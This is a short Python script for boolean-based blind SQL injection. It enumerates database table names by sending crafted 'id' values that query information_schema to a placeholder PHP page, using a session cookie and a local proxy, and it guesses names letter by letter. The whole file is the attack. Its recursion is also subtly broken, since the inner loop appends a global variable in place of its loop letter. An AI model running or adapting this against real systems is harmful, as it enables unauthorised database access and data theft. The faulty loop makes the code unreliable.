#!/usr/bin/env python3
#
# Boolean based SQL injection
#
import requests
import sys

# Ascii letters ordered by the most common letter first
ascii_letters = "etaoinshrdlcumwfgypbvkjxqz"

url   = "http://foo/bar.php"
token = "session12345"
agent = "Mozilla/5.0"

def dbquery(guess):
    query = "12345+AND/**/(SELECT/**/count(TABLE_NAME)+from+information_schema.tables+WHERE+table_name+like+'" + guess + "%'+LIMIT+1)+>+0"
    request_url = url + "?id=" + query

    resp = requests.get(request_url, verify=False,
        cookies={"Session" : token},
        headers={"User-Agent" : agent},
        proxies={"http" : "http://localhost:8080"},
    )

    # Use whatever response content that indiciate that our SQL query returned false
    if "errorStringGoesHere" not in resp.text:
        print(guess)
        for char in ascii_letters:
            dbquery(guess + c)

        return guess

for c in ascii_letters:
    dbquery(c)
